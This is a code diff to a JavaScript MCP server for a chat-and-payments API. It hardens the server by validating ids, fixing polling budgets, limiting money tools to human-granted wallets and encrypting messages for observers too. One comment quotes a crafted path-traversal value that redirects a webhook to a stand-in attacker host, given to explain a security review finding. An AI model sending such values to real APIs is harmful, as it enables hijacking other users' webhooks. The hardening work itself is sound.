@@ -47,17 +47,60 @@ function requireString(value, field) {
   return s;
 }
 
+// Every Salt record id is a uuid (salt-api's schema uses `id: :uuid`
+// everywhere); an integer form is accepted too since some ids elsewhere in
+// the ecosystem are still plain integers, and this check is about shape,
+// not about knowing salt-api's schema by heart. A 2026-09-18 security
+// review found `update_card`'s `card_id` reaching
+// src/salt-bearer-client.mjs completely unvalidated, so a crafted value
+// like `../agents/callback?webhook=https://attacker.example/hook` turned
+// a PATCH to `/api/v1/cards/:id` into a PATCH to `/api/v1/agents/callback`
+// instead (a path traversal that could have redirected a real agent's
+// webhook). This is the FIRST of two independent layers that close it --
+// the second is salt-bearer-client.mjs's own encodeURIComponent on every
+// path-interpolated value, which stays even though this check should
+// never let anything past it that needed encoding in the first place.
+const UUID_RE = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
+const INTEGER_ID_RE = /^[0-9]+$/;
+
+function assertPlainId(value, field) {
+  const s = requireString(value, field);
+  if (!UUID_RE.test(s) && !INTEGER_ID_RE.test(s)) {
+    throw new Error(`${field} must be a plain Salt id (a uuid or an integer) -- refusing "${s.slice(0, 60)}".`);
+  }
+  return s;
+}
+
 function findMemberByHandle(members, handle) {
   const needle = String(handle || "").trim().toLowerCase().replace(/^@/, "");
   return (Array.isArray(members) ? members : []).find((m) => String(m.username || "").toLowerCase() === needle);
 }
 
-/** Picks the caller's own receiving wallet -- mirrors salt-agent-sdk actions.ts's myWalletId. */
-async function myWalletId(rest, bearerToken) {
-  const wallets = await rest.listWallets(bearerToken);
-  const active = wallets.filter((w) => !w.deleted_at);
-  if (active.length === 0) throw new Error("This connection has no wallet to receive payments -- add one in Salt first.");
-  return active[0].id;
+/**
+ * Picks a wallet the human explicitly attached to THIS OAuth grant for the
+ * given chain/testnet. A keyless agent owns NO wallet of its own, ever --
+ * that is a permanent design decision (a K5 security review said so
+ * explicitly: "Never propose giving keyless agents their own wallet"),
+ * not a gap waiting to be filled in. Every money tool below therefore
+ * spends only a wallet the human chose to expose when they granted the
+ * `money` scope at Salt's consent screen (`GET /api/v1/oauth2/grant` ->
+ * `{scopes, wallets: [{id, chain, testnet, label}]}`). `grant` here is
+ * the SAME object src/http.mjs's per-request token validation already
+ * fetched to confirm the bearer is real (see createTokenValidator) -- no
+ * second call to salt-api, and no reading of `/api/v1/wallets` at all
+ * (that endpoint lists wallets Salt itself has no reason to let a
+ * connected, potentially third-party MCP client enumerate).
+ */
+function requireGrantedWalletId(grant, { chain, testnet }) {
+  const wallets = Array.isArray(grant?.wallets) ? grant.wallets : [];
+  const match = wallets.find(
+    (w) => String(w.chain || "").toLowerCase() === String(chain || "").toLowerCase() && Boolean(w.testnet) === Boolean(testnet)
+  );
+  if (!match) {
+    const network = testnet ? `${chain} testnet` : chain;
+    throw new Error(`This connection can't receive payments on ${network}. The owner can add a wallet in Salt › Settings › Connected apps.`);
+  }
+  return match.id;
 }
 
 /**
@@ -90,21 +133,37 @@ function decodeAskId(askId) {
   }
 }
 
+// ask_human's and get_ask_result's polling budgets. FIXED in code, never
+// from tool arguments -- a 2026-09-18 security review found the earlier
+// `_maxTotalMs` escape hatch (meant to be test-only) was read straight off
+// the wire-facing `input` object, so any real MCP client could set it and
+// control how long/how hard this server hammered salt-api per call. There
+// is no argument named `_maxTotalMs` (or anything else) in either tool's
+// inputSchema any more, and these functions never look for one.
+const ASK_HUMAN_MAX_MS = 50_000;
+const GET_ASK_RESULT_MAX_MS = 2_000;
+
 /**
  * Short-polls the socket-mode outbox (K2 contract,
  * GET /api/v1/agent/updates) for a card_interaction on `cardId`, up to
- * `maxTotalMs` of wall time. Exported so tests can drive it directly with
- * a small budget and a mock `rest`, instead of waiting out a real 50s
- * budget. Each call to `rest.agentUpdates` is itself expected to pace
- * (the real server waits up to ~2s when there's nothing new -- see K2's
- * "Short poll" contract), so this loop adds no artificial sleep of its
- * own; the wall-clock deadline is what bounds it either way.
+ * `maxTotalMs` of wall time (always one of the two constants above in
+ * production; tests pass their own small budgets directly to this
+ * exported function, never through a tool argument). `signal` (an
+ * AbortSignal) stops the loop early -- wired in src/http.mjs to the
+ * underlying HTTP request's own `res.on("close")`, so a client that hangs
+ * up mid-ask_human doesn't leave this server polling salt-api for up to
+ * another 50s on its behalf. Each call to `rest.agentUpdates` is itself
+ * expected to pace (the real server waits up to ~2s when there's nothing
+ * new -- see K2's "Short poll" contract), so this loop adds no artificial
+ * sleep of its own; the wall-clock deadline (and the signal) are what
+ * bound it either way.
  */
-export async function pollForCardInteraction(rest, bearerToken, { cardId, after = 0, maxTotalMs }) {
+export async function pollForCardInteraction(rest, bearerToken, { cardId, after = 0, maxTotalMs, signal }) {
   const deadline = Date.now() + maxTotalMs;
   let cursor = after;
   do {
-    const response = await rest.agentUpdates(bearerToken, { after: cursor, timeoutSeconds: 2, limit: 50 });
+    if (signal?.aborted) return { found: false, cursor };
+    const response = await rest.agentUpdates(bearerToken, { after: cursor, timeoutSeconds: 2, limit: 50, signal });
     const updates = Array.isArray(response?.updates) ? response.updates : [];
     for (const update of updates) {
       if (update.event !== "card_interaction") continue;
@@ -119,7 +178,7 @@ export async function pollForCardInteraction(rest, bearerToken, { cardId, after 
       }
     }
     if (response && response.cursor !== undefined) cursor = response.cursor;
-  } while (Date.now() < deadline);
+  } while (Date.now() < deadline && !signal?.aborted);
   return { found: false, cursor };
 }
 
@@ -190,22 +249,26 @@ async function listChats(rest, bearerToken) {
 }
 
 async function sendMessage(rest, bearerToken, input) {
-  const chatId = requireString(input.chat_id, "chat_id");
+  const chatId = assertPlainId(input.chat_id, "chat_id");
   const text = requireString(input.text, "text");
   const chat = await rest.getChat(bearerToken, chatId);
   const members = chat?.session?.users || chat?.users || [];
-  const recipients = members.filter((m) => !m.observer);
-  const missingKey = recipients.find((m) => !m.public_key);
+  // EVERY member, observers included -- never filtered. A human owner
+  // observes a delegation chat PRECISELY so they can audit it (CLAUDE.md's
+  // "Delegation observability"); excluding observers here, as an earlier
+  // version of this function did, silently defeated that for any message a
+  // keyless agent sent. A 2026-09-18 security review caught it.
+  const missingKey = members.find((m) => !m.public_key);
   if (missingKey) {
     throw new Error(`Can't send: ${missingKey.display_name || missingKey.username || "a member"} hasn't set up an encryption key yet.`);
   }
-  const ciphertext = await encryptFor(text, recipients.map((m) => m.public_key));
+  const ciphertext = await encryptFor(text, members.map((m) => m.public_key));
   const result = await rest.postMessage(bearerToken, chatId, ciphertext);
   return { sent: true, message_id: result?.id ?? null };
 }
 
 async function postCardTool(rest, bearerToken, input) {
-  const chatId = requireString(input.chat_id, "chat_id");
+  const chatId = assertPlainId(input.chat_id, "chat_id");
   const blocks = Array.isArray(input.blocks) && input.blocks.length > 0 ? input.blocks : null;
   if (!blocks) throw new Error("blocks is required (at least one card block).");
   const result = await rest.postCard(bearerToken, chatId, blocks, input.text || "");
@@ -213,15 +276,15 @@ async function postCardTool(rest, bearerToken, input) {
 }
 
 async function updateCardTool(rest, bearerToken, input) {
-  const cardId = requireString(input.card_id, "card_id");
+  const cardId = assertPlainId(input.card_id, "card_id");
   const blocks = Array.isArray(input.blocks) && input.blocks.length > 0 ? input.blocks : null;
   if (!blocks) throw new Error("blocks is required (at least one card block).");
   await rest.updateCard(bearerToken, cardId, blocks);
   return { updated: true, card_id: cardId, blocks };
 }
 
-async function askHuman(rest, bearerToken, input) {
-  const chatId = requireString(input.chat_id, "chat_id");
+async function askHuman(rest, bearerToken, input, ctx) {
+  const chatId = assertPlainId(input.chat_id, "chat_id");
   const to = requireString(input.to, "to");
   const question = requireString(input.question, "question");
   const options = Array.isArray(input.options) ? input.options.filter((o) => typeof o === "string" && o.trim()) : [];
@@ -242,12 +305,19 @@ async function askHuman(rest, bearerToken, input) {
   const posted = await rest.postCard(bearerToken, chatId, blocks, question.slice(0, 200));
   const cardId = posted?.resource_id ?? posted?.id;
 
-  // `_maxTotalMs` is not part of the public inputSchema -- it's a test-only
-  // escape hatch (see tests/keyless-tools.test.mjs) so a test can exercise
-  // the "nobody answered in time" path without a real MCP client ever
-  // being able to set it, since real tool arguments are validated against
-  // inputSchema upstream of execute().
-  const poll = await pollForCardInteraction(rest, bearerToken, { cardId, after: 0, maxTotalMs: input._maxTotalMs ?? 50000 });
+  // `ctx.maxTotalMsOverride` (like `ctx.signal`/`ctx.grant`) is internal
+  // plumbing, never wire-facing input -- src/http.mjs never sets it, only
+  // tests calling runKeylessTool directly do, to exercise the "nobody
+  // answered in time" path without a real 50s wait. There is no argument
+  // by this or any other name in ask_human's inputSchema, and nothing
+  // reads one off `input`; that's the exact gap a 2026-09-18 security
+  // review found (a client-supplied `_maxTotalMs` was honoured).
+  const poll = await pollForCardInteraction(rest, bearerToken, {
+    cardId,
+    after: 0,
+    maxTotalMs: ctx?.maxTotalMsOverride ?? ASK_HUMAN_MAX_MS,
+    signal: ctx?.signal,
+  });
   const askId = encodeAskId({ cardId, chatId, humanId: human.id, actionMap, cursor: poll.cursor ?? 0 });
   if (!poll.found) return { status: "pending", ask_id: askId };
 
@@ -255,13 +325,14 @@ async function askHuman(rest, bearerToken, input) {
   return { answer, ask_id: askId };
 }
 
-async function getAskResult(rest, bearerToken, input) {
+async function getAskResult(rest, bearerToken, input, ctx) {
   const askId = requireString(input.ask_id, "ask_id");
   const state = decodeAskId(askId);
   const poll = await pollForCardInteraction(rest, bearerToken, {
     cardId: state.cardId,
     after: state.cursor ?? 0,
-    maxTotalMs: input._maxTotalMs ?? 2000,
+    maxTotalMs: ctx?.maxTotalMsOverride ?? GET_ASK_RESULT_MAX_MS,
+    signal: ctx?.signal,
   });
   const nextAskId = encodeAskId({ ...state, cursor: poll.cursor ?? state.cursor ?? 0 });
   if (!poll.found) return { status: "pending", ask_id: nextAskId };
@@ -269,15 +340,17 @@ async function getAskResult(rest, bearerToken, input) {
   return { answer, ask_id: nextAskId };
 }
 
-async function requestPayment(rest, bearerToken, input) {
-  const chatId = requireString(input.chat_id, "chat_id");
+async function requestPayment(rest, bearerToken, input, ctx) {
+  const chatId = assertPlainId(input.chat_id, "chat_id");
   const to = requireString(input.to, "to");
   const amount = requireString(input.amount, "amount");
+  const chain = requireString(input.chain, "chain");
+  const testnet = Boolean(input.testnet);
   const chat = await rest.getChat(bearerToken, chatId);
   const members = chat?.session?.users || chat?.users || [];
   const receiver = findMemberByHandle(members, to);
   if (!receiver) throw new Error(`@${to.replace(/^@/, "")} isn't in this chat.`);
-  const walletId = await myWalletId(rest, bearerToken);
+  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
   const request = await rest.createTransferRequest(bearerToken, {
     chatId,
     receiverId: receiver.id,
@@ -288,9 +361,11 @@ async function requestPayment(rest, bearerToken, input) {
   return { request_id: request.id, status: request.status, amount: request.amount };
 }
 
-async function sendInvoice(rest, bearerToken, input) {
-  const chatId = requireString(input.chat_id, "chat_id");
+async function sendInvoice(rest, bearerToken, input, ctx) {
+  const chatId = assertPlainId(input.chat_id, "chat_id");
   const to = requireString(input.to, "to");
+  const chain = requireString(input.chain, "chain");
+  const testnet = Boolean(input.testnet);
   const items = Array.isArray(input.line_items) ? input.line_items : [];
   if (items.length === 0) throw new Error("line_items is required.");
   const chat = await rest.getChat(bearerToken, chatId);
@@ -305,7 +380,7 @@ async function sendInvoice(rest, bearerToken, input) {
     return { name, qty, unit_price: unitPrice, subtotal: multiplyDecimalStrings(qty, unitPrice) };
   });
   const amount = sumDecimalStrings(lineItems.map((i) => i.subtotal));
-  const walletId = await myWalletId(rest, bearerToken);
+  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
   const invoice = await rest.createTransferRequest(bearerToken, {
     chatId,
     receiverId: receiver.id,
@@ -320,7 +395,7 @@ async function sendInvoice(rest, bearerToken, input) {
 }
 
 async function getPaymentStatus(rest, bearerToken, input) {
-  const requestId = requireString(input.request_id, "request_id");
+  const requestId = assertPlainId(input.request_id, "request_id");
   const requests = await rest.listTransferRequests(bearerToken);
   const found = requests.find((r) => String(r.id) === requestId);
   if (!found) throw new Error("No payment request found with that id.");
@@ -334,13 +409,17 @@ async function getPaymentStatus(rest, bearerToken, input) {
 }
 
 async function listProductsTool(rest, bearerToken, input) {
-  const products = await rest.listProducts(bearerToken, input.seller_id);
+  const sellerId = input.seller_id ? assertPlainId(input.seller_id, "seller_id") : undefined;
+  const products = await rest.listProducts(bearerToken, sellerId);
   return { products };
 }
 
-async function createProductTool(rest, bearerToken, input) {
-  const walletId = await myWalletId(rest, bearerToken);
-  const product = await rest.createProduct(bearerToken, { ...input, wallet_id: walletId });
+async function createProductTool(rest, bearerToken, input, ctx) {
+  const chain = requireString(input.chain, "chain");
+  const testnet = Boolean(input.testnet);
+  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
+  const { chain: _chain, testnet: _testnet, ...productFields } = input;
+  const product = await rest.createProduct(bearerToken, { ...productFields, wallet_id: walletId });
   return { created: true, product };
 }
 
@@ -546,7 +625,9 @@ export const KEYLESS_TOOLS = [
   {
     name: "request_payment",
     title: "Request Payment",
-    description: `Creates a real, payable money request from a chat member. ${MONEY_HINT}`,
+    description:
+      "Creates a real, payable money request from a chat member, paid into a wallet the human " +
+      `attached to this connection's grant for the given chain (never a wallet of this agent's own -- it has none). ${MONEY_HINT}`,
     scope: SCOPES.MONEY,
     inputSchema: {
       type: "object",
@@ -554,9 +635,11 @@ export const KEYLESS_TOOLS = [
         chat_id: { type: "string" },
         to: { type: "string", description: "The @handle of the chat member being asked to pay." },
         amount: { type: "string", description: "A decimal amount, e.g. \"12.50\"." },
+        chain: { type: "string", description: "The chain to receive on, e.g. \"ethereum\", \"base\" -- must match a wallet granted to this connection." },
+        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
         message: { type: "string" },
       },
-      required: ["chat_id", "to", "amount"],
+      required: ["chat_id", "to", "amount", "chain"],
     },
     outputSchema: {
       type: "object",
@@ -569,13 +652,17 @@ export const KEYLESS_TOOLS = [
   {
     name: "send_invoice",
     title: "Send Invoice",
-    description: `Sends an itemized invoice to a chat member on the same payment rail as request_payment. ${MONEY_HINT}`,
+    description:
+      "Sends an itemized invoice to a chat member on the same payment rail as request_payment, into a wallet " +
+      `the human attached to this connection's grant for the given chain. ${MONEY_HINT}`,
     scope: SCOPES.MONEY,
     inputSchema: {
       type: "object",
       properties: {
         chat_id: { type: "string" },
         to: { type: "string" },
+        chain: { type: "string", description: "The chain to receive on -- must match a wallet granted to this connection." },
+        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
         line_items: {
           type: "array",
           items: {
@@ -590,7 +677,7 @@ export const KEYLESS_TOOLS = [
         },
         due_date: { type: "string" },
       },
-      required: ["chat_id", "to", "line_items"],
+      required: ["chat_id", "to", "chain", "line_items"],
     },
     outputSchema: {
       type: "object",
@@ -633,7 +720,9 @@ export const KEYLESS_TOOLS = [
   {
     name: "create_product",
     title: "Create Product",
-    description: `Adds a real, billable product to this connection's shop. ${MONEY_HINT}`,
+    description:
+      "Adds a real, billable product to this connection's shop, pinned to a wallet the human attached to this " +
+      `connection's grant for the given chain. ${MONEY_HINT}`,
     scope: SCOPES.MONEY,
     inputSchema: {
       type: "object",
@@ -641,9 +730,11 @@ export const KEYLESS_TOOLS = [
         title: { type: "string" },
         kind: { type: "string", enum: ["one_time", "metered", "subscription"] },
         price: { type: "string" },
+        chain: { type: "string", description: "The chain this product is priced/paid in -- must match a wallet granted to this connection." },
+        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
         description: { type: "string" },
       },
-      required: ["title", "kind", "price"],
+      required: ["title", "kind", "price", "chain"],
     },
     outputSchema: { type: "object", properties: { created: { type: "boolean" }, product: { type: "object" } }, required: ["created"] },
     annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
@@ -685,12 +776,27 @@ export function toKeylessMcpTools(tools = KEYLESS_TOOLS) {
  * answers 403 for a missing scope, return a plain-sentence tool error").
  * Any other error's message is passed through as-is -- SaltBearerApiError
  * already carries salt-api's own one-sentence `error` body.
+ *
+ * `signal` (AbortSignal) and `grant` ({scopes, wallets}, from the SAME
+ * token-validation call src/http.mjs already made for this request -- see
+ * createTokenValidator) are threaded through to whichever tool's
+ * `execute` actually wants them (ask_human/get_ask_result for the
+ * signal; request_payment/send_invoice/create_product for the grant's
+ * wallets). Every other tool ignores its 4th argument.
+ *
+ * `maxTotalMsOverride` is ONLY for tests calling this function directly --
+ * src/http.mjs (the one real caller reachable from the wire) never passes
+ * it, so no MCP client can ever set ask_human's/get_ask_result's polling
+ * budget. Fixing this at exactly this boundary (an options object only
+ * server-side code populates) rather than reading it off `args` is the
+ * point: see keyless-tools.mjs's `_maxTotalMs` history in git log for the
+ * bug this replaced.
  */
-export async function runKeylessTool(name, args, { rest, bearerToken }) {
+export async function runKeylessTool(name, args, { rest, bearerToken, signal, grant, maxTotalMsOverride }) {
   const tool = KEYLESS_TOOLS.find((t) => t.name === name);
   if (!tool) throw new Error(`Tool "${name}" is not available on this connection.`);
   try {
-    return await tool.execute(rest, bearerToken, args ?? {});
+    return await tool.execute(rest, bearerToken, args ?? {}, { signal, grant, maxTotalMsOverride });
   } catch (err) {
     if (err instanceof SaltBearerApiError && err.status === 403) {
       throw new Error(SCOPE_REFUSAL_MESSAGE[tool.scope] || SCOPE_REFUSAL_MESSAGE[SCOPES.CHAT]);
